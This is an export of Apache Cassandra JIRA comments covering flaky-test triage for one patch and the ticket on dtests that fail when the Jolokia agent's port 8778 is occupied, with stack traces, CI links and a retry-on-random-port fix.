|[4.1|https://github.com/ekaterinadimitrova2/cassandra/tree/17873-4.1]|[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-4.1] #1978 is the full CI run|
|[trunk|https://github.com/ekaterinadimitrova2/cassandra/tree/17873-trunk]|[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-trunk] #1979 is the full CI run|

Commit pending CI results;;;","19/Oct/22 04:57;bereng;Am I seeing some new flaky failures like the compression opttions or the UUID restart one? wdyt [~e.dimitrova]?;;;","20/Oct/22 02:22;e.dimitrova;4.0:
 * [testTruncationReleasesLogSpace|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1977/workflows/041331ac-fce0-47ac-b475-83759ac4e2c7/jobs/15701/tests#failed-test-0] - known issue from CASSANDRA-17884
 * testDropCompactStorage - CASSANDRA-17674

4.1:
 * test_compression_cql_options - CASSANDRA-16861
 * test_quorum_requirement - known problem from  CASSANDRA-17922 _I think_ (cc [~brandon.williams])

trunk:
 * testOutboundConnectionsAreInterruptedWhenAuthFails - seems like flaky test that has nothing to do with this patch; I ran it [500 times with latest trunk|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1980/workflows/65ac078b-cb6a-4eb9-b8f0-b650e2886c13/jobs/15771/tests#failed-test-0] and it fails in a few different ways:

{code:java}
junit.framework.AssertionFailedError: expected:<0> but was:<1> at org.apache.cassandra.distributed.test.InternodeEncryptionEnforcementTest.lambda$testOutboundConnectionsAreRejectedWhenAuthFails$776879b6$1(InternodeEncryptionEnforcementTest.java:113) at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:96) at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:61) at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:71) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) at java.lang.Thread.run(Thread.java:748){code}
{code:java}
junit.framework.AssertionFailedError at org.apache.cassandra.distributed.test.InternodeEncryptionEnforcementTest.lambda$testOutboundConnectionsAreInterruptedWhenAuthFails$776879b6$1(InternodeEncryptionEnforcementTest.java:164) at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:96) at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:61) at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:71) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) at java.lang.Thread.run(Thread.java:748){code}
{code:java}
junit.framework.AssertionFailedError: expected:<0> but was:<2> at org.apache.cassandra.distributed.test.InternodeEncryptionEnforcementTest.lambda$testOutboundConnectionsAreRejectedWhenAuthFails$776879b6$1(InternodeEncryptionEnforcementTest.java:113) at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:96) at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:61) at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:71) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) at java.lang.Thread.run(Thread.java:748){code}
It is significantly more flaky on JDK8. The stack traces were from JDK8. (failed 115 times out of 500)

In JDK11 we see: (only 7 failures out of 500)
{code:java}
junit.framework.AssertionFailedError: Timeout occurred. Please note the time in the report does not reflect the time until the timeout. at jdk.internal.reflect.GeneratedMethodAccessor4.invoke(Unknown Source) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.base/java.util.Vector.forEach(Vector.java:1388) at jdk.internal.reflect.GeneratedMethodAccessor4.invoke(Unknown Source) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at jdk.internal.reflect.GeneratedMethodAccessor4.invoke(Unknown Source) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.base/java.util.Vector.forEach(Vector.java:1388) at jdk.internal.reflect.GeneratedMethodAccessor4.invoke(Unknown Source) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at jdk.internal.reflect.GeneratedMethodAccessor4.invoke(Unknown Source) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43){code}
{code:java}
junit.framework.AssertionFailedError: expected:<0> but was:<1> at org.apache.cassandra.distributed.test.InternodeEncryptionEnforcementTest.lambda$testOutboundConnectionsAreRejectedWhenAuthFails$776879b6$1(InternodeEncryptionEnforcementTest.java:113) at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:96) at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:61) at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:71) at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) at java.base/java.lang.Thread.run(Thread.java:829){code}
Now funny enough neither of those is the same timeout I see with my patch :D 

So I ran 500 times the test class with the patch(rebased again as there were a few commits from today, not affecting this patch but just to ensure we are on par with only this commit difference) in a loop to check ""the state of the art"": - [run 1981|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-trunk]

Similar results for trunk
 * testRestartWithUUIDDisabled - consistently failed with JDK8 and also JDK11; I do not see how it can be related to this patch; I also saw it failing in the last two Jenkins runs so I just opened a ticket and pinged the authors; CASSANDRA-17975

With all that in mind I'd say I commit this ticket and open one more follow up ticket for testOutboundConnectionsAreInterruptedWhenAuthFails. WDYT?;;;","20/Oct/22 04:58;bereng;Yep makes sense to me +1. Thx!;;;","20/Oct/22 07:10;benedict;> Which reminds me I might have to talk to you benedict  about the jdk17 and the simulator so I do not miss anything there but I am not there yet. 

Actually, the simulator doesn't even support JDK11 yet. I believe [~dcapwell] is looking into JDK11/17 support for the simulator soon.

I think it would be fine to leave the simulator on JDK8 for a little while anyway, as it is testing things that are orthogonal to the JDK version.;;;","20/Oct/22 14:47;e.dimitrova;{quote}Actually, the simulator doesn't even support JDK11 yet. I believe [~dcapwell] is looking into JDK11/17 support for the simulator soon.
{quote}
 

That's really good to know, thanks! I will follow up with him when the time comes. I was actually about to ask why we don't test with jdk11. Now I actually  remember I also pushed the tests with jdk11 and some exports were required. So I had a TODO to ask;;;","20/Oct/22 15:44;e.dimitrova;It seems I actually opened a ticket some time ago for testOutboundConnectionsAreInterruptedWhenAuthFails CASSANDRA-17708.

Not sure why my search didn't find it;;;","20/Oct/22 18:21;e.dimitrova;Reran sanity check CI as there were commits yesterday and I preferred to be safe than sorry later. No heavy upgrade tests though.

4.0 [#1983|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-4.0]
 * [testMessageDeliveryOnReconnect|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1983/workflows/e4a63e37-c890-4cdb-8d52-7ad6e26e49b6/jobs/15843/tests#failed-test-0] - CASSANDRA-16677
 * [test_resume_stopped_build|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1983/workflows/2e4cf5a1-dd1e-4a45-bfa5-cb7a7d936b27/jobs/15828/tests#failed-test-0] - Not related. For completeness [this run|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=test-resume-stopped-build] shows it fails on current 4.0. I will open a new ticket 

4.1  [#1984|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-4.1] all green

trunk is green (please ignore the repeated test, the rest is green) [#1982|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-trunk]

To https://github.com/apache/cassandra.git

   a9df34c62a..ce1584ccc8  cassandra-4.0 -> cassandra-4.0

   f90148a344..1df5dd671e  cassandra-4.1 -> cassandra-4.1

   ac68f24512..6f709ca0ec  trunk -> trunk

 ;;;","20/Oct/22 18:29;e.dimitrova;CASSANDRA-17980 opened for the flaky test;;;","21/Oct/22 05:00;bereng;Good one!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Dtests failing intermittently on Jolokia agent,CASSANDRA-17872,13479519,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,adelapena,adelapena,31/Aug/22 16:20,05/Oct/22 22:22,13/Jul/23 08:40,08/Sep/22 14:57,4.1,4.1-beta1,,,,,Test/dtest/python,,,,0,,"Some apparently unrealeted Python dtests fail with an output of the form:
{code:java}
Error Message
subprocess.CalledProcessError: Command '('/usr/lib/jvm/java-8-openjdk-amd64/bin/java', '-cp', '/usr/lib/jvm/java-8-openjdk-amd64/lib/tools.jar:/home/cassandra/cassandra/cassandra-dtest/tools/../lib/jolokia-jvm-1.7.1-agent.jar', 'org.jolokia.jvmagent.client.AgentLauncher', '--host', '127.0.0.1', 'start', '706')' returned non-zero exit status 1.
Stacktrace
self = <auth_test.TestAuthRoles object at 0x7fc6cb4313a0>

(...)

    
        mbean = make_mbean('auth', type='RolesCache')
>       with JolokiaAgent(self.cluster.nodelist()[0]) as jmx:

auth_test.py:1888: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
tools/jmxutils.py:309: in __enter__
    self.start()
tools/jmxutils.py:187: in start
    subprocess.check_output(args, stderr=subprocess.STDOUT)
/usr/lib/python3.8/subprocess.py:415: in check_output
    return run(*popenargs, stdout=PIPE, timeout=timeout, check=True,
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

input = None, capture_output = False, timeout = None, check = True
popenargs = (('/usr/lib/jvm/java-8-openjdk-amd64/bin/java', '-cp', '/usr/lib/jvm/java-8-openjdk-amd64/lib/tools.jar:/home/cassandr...t/tools/../lib/jolokia-jvm-1.7.1-agent.jar', 'org.jolokia.jvmagent.client.AgentLauncher', '--host', '127.0.0.1', ...),)
kwargs = {'stderr': -2, 'stdout': -1}
process = <subprocess.Popen object at 0x7fc6c9afb910>
stdout = b""Couldn't start agent for PID 706\nPossible reason could be that port '8778' is already occupied.\nPlease check the standard output of the target process for a detailed error message.\n""
stderr = None, retcode = 1

(...)

            if check and retcode:
>               raise CalledProcessError(retcode, process.args,
                                         output=stdout, stderr=stderr)
E               subprocess.CalledProcessError: Command '('/usr/lib/jvm/java-8-openjdk-amd64/bin/java', '-cp', '/usr/lib/jvm/java-8-openjdk-amd64/lib/tools.jar:/home/cassandra/cassandra/cassandra-dtest/tools/../lib/jolokia-jvm-1.7.1-agent.jar', 'org.jolokia.jvmagent.client.AgentLauncher', '--host', '127.0.0.1', 'start', '706')' returned non-zero exit status 1.

/usr/lib/python3.8/subprocess.py:516: CalledProcessError
{code}
Here is a of bunch hits in different tests across multiple branches:
 * [https://app.circleci.com/pipelines/github/adelapena/cassandra/2035/workflows/1e06bd6d-8bd6-4703-85db-2b41e964134e/jobs/20403]
 * [https://ci-cassandra.apache.org/job/Cassandra-3.11/387/testReport/dtest-novnode.thrift_hsha_test/TestThriftHSHA/test_closing_connections/]
 * [https://ci-cassandra.apache.org/job/Cassandra-4.0/454/testReport/dtest-novnode.transient_replication_test/TestTransientReplicationRepairLegacyStreaming/test_transient_incremental_repair/]
 * [https://ci-cassandra.apache.org/job/Cassandra-4.0/461/testReport/dtest-novnode.read_repair_test/TestSpeculativeReadRepair/test_failed_read_repair/]
 * [https://ci-cassandra.apache.org/job/Cassandra-4.0/461/testReport/dtest-novnode.transient_replication_test/TestTransientReplication/test_cheap_quorums/]
 * [https://ci-cassandra.apache.org/job/Cassandra-4.0/464/testReport/dtest-offheap.repair_tests.incremental_repair_test/TestIncRepair/test_parent_repair_session_cleanup/]
 * [https://ci-cassandra.apache.org/job/Cassandra-4.0/465/testReport/dtest-novnode.transient_replication_test/TestTransientReplicationRepairLegacyStreaming/test_transient_incremental_repair/]
 * [https://ci-cassandra.apache.org/job/Cassandra-4.0/465/testReport/dtest-offheap.repair_tests.incremental_repair_test/TestIncRepair/test_repaired_tracking_with_partition_deletes/]
 * [https://ci-cassandra.apache.org/job/Cassandra-4.1/135/testReport/dtest-novnode.transient_replication_test/TestTransientReplicationRepairStreamEntireSSTable/test_primary_range_repair/]
 * [https://ci-cassandra.apache.org/job/Cassandra-4.1/135/testReport/dtest.auth_test/TestNetworkAuth/test_revoked_login/]
 * [https://ci-cassandra.apache.org/job/Cassandra-4.1/145/testReport/dtest-novnode.transient_replication_test/TestTransientReplicationRepairLegacyStreaming/test_primary_range_repair/]
 * [https://ci-cassandra.apache.org/job/Cassandra-4.1/148/testReport/dtest-novnode.auth_test/TestAuthRoles/test_role_caching_authenticated_user/]
 * [https://ci-cassandra.apache.org/job/Cassandra-4.1/151/testReport/dtest-novnode.read_repair_test/TestSpeculativeReadRepair/test_speculative_data_request/]
 * [https://ci-cassandra.apache.org/job/Cassandra-4.1/151/testReport/dtest.read_repair_test/TestSpeculativeReadRepair/test_quorum_requirement_on_speculated_read/]
 * [https://ci-cassandra.apache.org/job/Cassandra-trunk/1288/testReport/dtest.jmx_test/TestJMX/test_mv_metric_mbeans_release/]
 * [https://ci-cassandra.apache.org/job/Cassandra-trunk/1295/testReport/dtest-novnode.client_request_metrics_local_remote_test/TestClientRequestMetricsLocalRemote/test_paxos/]
 * [https://ci-cassandra.apache.org/job/Cassandra-trunk/1295/testReport/dtest-offheap.read_repair_test/TestSpeculativeReadRepair/test_quorum_requirement/]
 * [https://ci-cassandra.apache.org/job/Cassandra-trunk/1296/testReport/dtest-novnode.transient_replication_test/TestTransientReplicationRepairStreamEntireSSTable/test_speculative_write_repair_cycle/]
 * [https://ci-cassandra.apache.org/job/Cassandra-trunk/1296/testReport/dtest-offheap.configuration_test/TestConfiguration/test_change_durable_writes/]
 * [https://ci-cassandra.apache.org/job/Cassandra-trunk/1300/testReport/dtest-novnode.read_repair_test/TestSpeculativeReadRepair/test_failed_read_repair/]
 * [https://ci-cassandra.apache.org/job/Cassandra-trunk/1300/testReport/dtest-novnode.transient_replication_test/TestTransientReplicationRepairStreamEntireSSTable/test_optimized_primary_range_repair/]
 * [https://ci-cassandra.apache.org/job/Cassandra-trunk/1301/testReport/dtest-novnode.client_request_metrics_local_remote_test/TestClientRequestMetricsLocalRemote/test_batch_and_slice/]
 * [https://ci-cassandra.apache.org/job/Cassandra-trunk/1301/testReport/dtest-novnode.client_request_metrics_local_remote_test/TestClientRequestMetricsLocalRemote/test_write_and_read/]
 * [https://ci-cassandra.apache.org/job/Cassandra-trunk/1302/testReport/dtest-upgrade.upgrade_tests.regression_test/TestForRegressionsUpgrade_current_3_11_x_To_indev_trunk/test13294/]

Note the common {{with JolokiaAgent(self.cluster.nodelist()[0])}} and {{""Possible reason could be that port '8778' is already occupied.""}} parts.

So far, the issue doesn't seem to reproduce on 3.0.",,adelapena,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17685,CASSANDRA-17300,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Sep 15 14:07:56 UTC 2022,,,,,,,All,,,,"0|z187ug:",9223372036854775807,,,,adelapena,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/ebac30ce41efccc3db2a19fc08e5d74c129b04f6,,,,,,,,,Test framework fix,,,,,"01/Sep/22 20:08;brandon.williams;I haven't been able to reproduce this running the auth test suite, or the entire split for it inside docker.  I have a [patch|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17872] to check that the port can be bound first, so at least this way we can know if it's an actual problem with that or something else we can't see.;;;","02/Sep/22 10:36;adelapena;I didn't manage to reproduce it again on Circle with the same auth suite. As for the patch, would it make sense to wait a bit and retry if the port is in use?;;;","02/Sep/22 10:41;brandon.williams;That's a good idea, I'll add polling the port a few times with a delay.;;;","02/Sep/22 14:24;brandon.williams;I pushed a [patch|https://github.com/driftx/cassandra-dtest/commit/a423f8d3af3744f51344bd1f66ca063c5755b2bf] that now polls the port every 2 seconds up to 5 times before giving up, and if that happens it includes the hostname in the error as a convenient way for us to observe if there are any trends related to the machines.;;;","02/Sep/22 17:52;adelapena;Looks good to me, that way we can see what is going on, and maybe we are lucky and the retry saves the run.

CI runs for the patch, just in case:
||Branch||CI||
|3.0|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2043/workflows/1c3d97df-165f-47ca-8540-08257d491e47]|
|3.11|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2042/workflows/bee641d2-7e3c-4a00-9058-0cbbe609437f]|
|4.0|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2041/workflows/d77e88ca-f08b-4bbe-9ffd-c1fddab2c5ed] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2041/workflows/035558b7-60a1-4435-a03b-1f8c83d2d11b]|
|4.1|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2044/workflows/e718b0b6-c2b4-4ef8-9135-f4c5970fbddd] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2044/workflows/3fafa650-5d96-479c-ae06-8bde42c7e8a7]|
|trunk|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2040/workflows/4f2303f6-23e1-41f8-8327-e2ec47342e99] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2040/workflows/2c73b27d-7528-472a-a379-1bd60bcf9957]|;;;","02/Sep/22 18:00;brandon.williams;Thanks, that made it occur to me that we could also try to debug this without committing it, I started a looped run on auth against my repo [here|https://app.circleci.com/pipelines/github/driftx/cassandra/627/workflows/beb33a0b-f05b-42c9-b896-9eb8957831b6/jobs/7164] just in case circle decides to reproduce.;;;","02/Sep/22 18:48;adelapena;Makes sense. I tried to repro on Circle with [3.0|https://app.circleci.com/pipelines/github/adelapena/cassandra/2038/workflows/3812aba9-800f-49c0-9985-789e843c2304] and [3.11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2039/workflows/99100c76-c19e-4e9a-9e80-f45fb9742726], but it timed out after 5h without hitting the failure. Maybe there is better/worse luck with 4.1.;;;","02/Sep/22 19:16;brandon.williams;I went through a significant portion the list of failures in the description and most failures were on cassandra49, cassandra50, and a few on cassandra28.  I've disabled those machines in Jenkins for the time being.;;;","03/Sep/22 10:02;brandon.williams;My [circle run|https://app.circleci.com/pipelines/github/driftx/cassandra/627/workflows/beb33a0b-f05b-42c9-b896-9eb8957831b6/jobs/7164] did time out, but not before showing some failures, and some problems with the script which I've fixed [here|https://github.com/driftx/cassandra-dtest/commit/19bc816ae8a294f5c6da3f5129c8be472c89f7d7].  I've started another run [here|https://app.circleci.com/pipelines/github/driftx/cassandra/627/workflows/a5f924f5-07d0-41dd-9ac1-1399d2b682a9].;;;","06/Sep/22 10:24;brandon.williams;That run also showed failures (which never recovered from the port being in use in the time allotted) before timing out.  I think this is not environmental but is a problem perhaps exacerbated by upgrade, since we did see it occasionally before that too.  I think it's time to take the kid gloves off and quit asking jolokia to stop and start using a bit more force.;;;","06/Sep/22 21:32;brandon.williams;There's actually nothing to get more forceful with, as I originally thought.  We are launching short-lived java instances from python that tell the main java process to load, or unload, the Jolokia agent which binds/unbinds the port.  So there's nothing to more forcefully kill to free the port because what is using the port must be the node's C* jvm, but that also doesn't seem likely as I would expect teardown failures.  Perhaps there is some other reason the port is busy that we can't see, like the socket is stuck in CLOSE_WAIT, but in any case, I propose we attempt to workaround it [here|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17872] by trying 8778 first, and then random ports between 8-9k after that.  If the port is in use for an unknown reason, this will get past it, and if the main jvm is indeed what has the port, this should cause some other kind of problem we can observe.;;;","07/Sep/22 10:20;adelapena;Trying random ports until we find an available one makes sense to me. Is [this run|https://app.circleci.com/pipelines/github/driftx/cassandra/627/workflows/b7c0873c-8dea-4f73-8c0b-6ad5149e5c7c/jobs/7169/tests] using the last version of the patch? It seems it has timed out without hitting any failures.

Unfortunately timed out runs don't store artifacts, but the output of each runner is still stored ([0|https://circleci.com/api/v1.1/project/github/driftx/cassandra/7169/output/105/0], [1|https://circleci.com/api/v1.1/project/github/driftx/cassandra/7169/output/105/1], [2|https://circleci.com/api/v1.1/project/github/driftx/cassandra/7169/output/105/2] and [3|https://circleci.com/api/v1.1/project/github/driftx/cassandra/7169/output/105/3]). None of these files seem to contain [the messages about retrying ports|https://github.com/driftx/cassandra-dtest/blob/abf9c9b759b7c7c789cafd1f13cca2c90543b36d/tools/jmxutils.py#L189] that are printed to stdout. Maybe we should use a logger instead of {{{}print{}}}?;;;","07/Sep/22 10:26;brandon.williams;That run isn't from this code, but I've started one [here|https://app.circleci.com/pipelines/github/driftx/cassandra/630/workflows/06a45660-689c-4ca4-bc3f-ff5925f2488a].  The prints do show up from older runs where we just checked the port, though.

edit: had to restart that run to fix something, so I changed the print to logger.info while I was there.;;;","07/Sep/22 16:53;brandon.williams;{code}
test_auth_metrics[2-4] failed and was not selected for rerun.
<class 'Exception'>
Port 8778 still in use on f579e5cf5446, unable to find another available port in range 8000-9000, cannot launch jolokia
[<TracebackEntry /home/cassandra/cassandra-dtest/auth_test.py:1071>, <TracebackEntry /home/cassandra/cassandra-dtest/tools/jmxutils.py:337>, <TracebackEntry /home/cassandra/cassandra-dtest/tools/jmxutils.py:205>]
{code}

;;;","07/Sep/22 17:03;adelapena;And also:
{code}
16:25:28,714 tools.jmxutils INFO Port 8778 in use, trying again on 8775
16:25:30,716 tools.jmxutils INFO Port 8775 in use, trying again on 8091
16:25:32,718 tools.jmxutils INFO Port 8091 in use, trying again on 8168
16:25:34,720 tools.jmxutils INFO Port 8168 in use, trying again on 8414
16:25:36,722 tools.jmxutils INFO Port 8414 in use, trying again on 8814
16:25:46,637 tools.jmxutils INFO Port 8778 in use, trying again on 8381
16:25:48,638 tools.jmxutils INFO Port 8381 in use, trying again on 8008
16:25:50,640 tools.jmxutils INFO Port 8008 in use, trying again on 8420
16:25:52,642 tools.jmxutils INFO Port 8420 in use, trying again on 8352
16:25:54,644 tools.jmxutils INFO Port 8352 in use, trying again on 8540
16:26:03,897 tools.jmxutils INFO Port 8778 in use, trying again on 8691
16:26:05,900 tools.jmxutils INFO Port 8691 in use, trying again on 8870
16:26:07,902 tools.jmxutils INFO Port 8870 in use, trying again on 8751
16:26:09,904 tools.jmxutils INFO Port 8751 in use, trying again on 8778
16:26:11,906 tools.jmxutils INFO Port 8778 in use, trying again on 8100
16:25:28,714 tools.jmxutils INFO Port 8778 in use, trying again on 8775
16:25:30,716 tools.jmxutils INFO Port 8775 in use, trying again on 8091
16:25:32,718 tools.jmxutils INFO Port 8091 in use, trying again on 8168
16:25:34,720 tools.jmxutils INFO Port 8168 in use, trying again on 8414
16:25:36,722 tools.jmxutils INFO Port 8414 in use, trying again on 8814
16:25:46,637 tools.jmxutils INFO Port 8778 in use, trying again on 8381
16:25:48,638 tools.jmxutils INFO Port 8381 in use, trying again on 8008
16:25:50,640 tools.jmxutils INFO Port 8008 in use, trying again on 8420
16:25:52,642 tools.jmxutils INFO Port 8420 in use, trying again on 8352
16:25:54,644 tools.jmxutils INFO Port 8352 in use, trying again on 8540
16:26:03,897 tools.jmxutils INFO Port 8778 in use, trying again on 8691
16:26:05,900 tools.jmxutils INFO Port 8691 in use, trying again on 8870
16:26:07,902 tools.jmxutils INFO Port 8870 in use, trying again on 8751
16:26:09,904 tools.jmxutils INFO Port 8751 in use, trying again on 8778
16:26:11,906 tools.jmxutils INFO Port 8778 in use, trying again on 8100
{code};;;","07/Sep/22 17:18;adelapena;I think that the random generator is producing the same sequence of five numbers in different threads. So maybe it works for the first 5+1 occupied ports, and then the ports are occupied again?;;;","07/Sep/22 17:54;brandon.williams;Yep, good catch.  I've pushed an update to seed with the node's pid and started another run [here|https://app.circleci.com/pipelines/github/driftx/cassandra/631/workflows/97e8c546-af5a-42a1-adb3-5177291ea0c0].;;;","07/Sep/22 19:20;brandon.williams;There was a bug where the socket was not reinitialized so all attempts failed after the first one did.  I've fixed that, and also persisted the port since we need to use that in the url if the port is not 8778.  [Here|https://app.circleci.com/pipelines/github/driftx/cassandra/632/workflows/b29ce0a4-0df8-4bc1-be8c-6e23fbb1aa57] we go again.;;;","07/Sep/22 20:37;brandon.williams;{code}
20:12:00,696 tools.jmxutils INFO Port 8778 in use, trying again on 8487
PASSED
{code}

It looks like this is working as intended now and the run was successful.;;;","08/Sep/22 09:46;adelapena;Great! It seems that the output of each runner shows two port conflicts with a single retry:
{code}
Runner 0
20:12:00,696 tools.jmxutils INFO Port 8778 in use, trying again on 8487
20:12:42,11 tools.jmxutils INFO Port 8778 in use, trying again on 8897
Runner 1
20:11:26,738 tools.jmxutils INFO Port 8778 in use, trying again on 8276
20:12:07,142 tools.jmxutils INFO Port 8778 in use, trying again on 8723
Runner 2
20:11:06,398 tools.jmxutils INFO Port 8778 in use, trying again on 8464
20:11:53,493 tools.jmxutils INFO Port 8778 in use, trying again on 8897
Runner 3
20:09:40,106 tools.jmxutils INFO Port 8778 in use, trying again on 8569
20:10:18,843 tools.jmxutils INFO Port 8778 in use, trying again on 8476
Runner 4
20:08:12,282 tools.jmxutils INFO Port 8778 in use, trying again on 8569
20:08:55,857 tools.jmxutils INFO Port 8778 in use, trying again on 8084
Runner 5
20:11:11,272 tools.jmxutils INFO Port 8778 in use, trying again on 8441
20:11:56,422 tools.jmxutils INFO Port 8778 in use, trying again on 8434
Runner 6
20:09:32,74 tools.jmxutils INFO Port 8778 in use, trying again on 8759
20:10:15,830 tools.jmxutils INFO Port 8778 in use, trying again on 8201
Runner 7
20:09:02,106 tools.jmxutils INFO Port 8778 in use, trying again on 8953
20:09:42,609 tools.jmxutils INFO Port 8778 in use, trying again on 8408
Runner 8
20:10:02,404 tools.jmxutils INFO Port 8778 in use, trying again on 8754
20:10:41,701 tools.jmxutils INFO Port 8778 in use, trying again on 8449
Runner 9
20:10:49,294 tools.jmxutils INFO Port 8778 in use, trying again on 8377
20:12:06,64 tools.jmxutils INFO Port 8778 in use, trying again on 8940
Runner 10
20:10:49,294 tools.jmxutils INFO Port 8778 in use, trying again on 8377
20:12:06,64 tools.jmxutils INFO Port 8778 in use, trying again on 8940
Runner 11
20:10:01,299 tools.jmxutils INFO Port 8778 in use, trying again on 8124
20:10:41,876 tools.jmxutils INFO Port 8778 in use, trying again on 8843
Runner 12
20:10:35,143 tools.jmxutils INFO Port 8778 in use, trying again on 8218
20:11:14,32 tools.jmxutils INFO Port 8778 in use, trying again on 8915
Runner 13
20:08:55,909 tools.jmxutils INFO Port 8778 in use, trying again on 8645
20:09:35,366 tools.jmxutils INFO Port 8778 in use, trying again on 8764
Runner 14
20:11:14,633 tools.jmxutils INFO Port 8778 in use, trying again on 8981
20:12:01,516 tools.jmxutils INFO Port 8778 in use, trying again on 8631
Runner 15
20:10:53,581 tools.jmxutils INFO Port 8778 in use, trying again on 8759
20:11:36,26 tools.jmxutils INFO Port 8778 in use, trying again on 8206
Runner 16
20:09:21,359 tools.jmxutils INFO Port 8778 in use, trying again on 8884
20:10:01,638 tools.jmxutils INFO Port 8778 in use, trying again on 8206
Runner 17
20:08:36,993 tools.jmxutils INFO Port 8778 in use, trying again on 8515
20:09:15,834 tools.jmxutils INFO Port 8778 in use, trying again on 8637
Runner 18
20:09:47,922 tools.jmxutils INFO Port 8778 in use, trying again on 8754
20:10:35,190 tools.jmxutils INFO Port 8778 in use, trying again on 8554
Runner 19
20:10:49,276 tools.jmxutils INFO Port 8778 in use, trying again on 8884
20:11:31,124 tools.jmxutils INFO Port 8778 in use, trying again on 8198
Runner 20
20:10:25,352 tools.jmxutils INFO Port 8778 in use, trying again on 8540
20:11:05,916 tools.jmxutils INFO Port 8778 in use, trying again on 8433
Runner 21
20:10:11,926 tools.jmxutils INFO Port 8778 in use, trying again on 8658
20:10:52,447 tools.jmxutils INFO Port 8778 in use, trying again on 8049
Runner 22
20:10:28,433 tools.jmxutils INFO Port 8778 in use, trying again on 8953
20:11:11,215 tools.jmxutils INFO Port 8778 in use, trying again on 8408
Runner 23
20:10:57,540 tools.jmxutils INFO Port 8778 in use, trying again on 8594
20:11:36,451 tools.jmxutils INFO Port 8778 in use, trying again on 8843
Runner 24
20:10:51,980 tools.jmxutils INFO Port 8778 in use, trying again on 8198
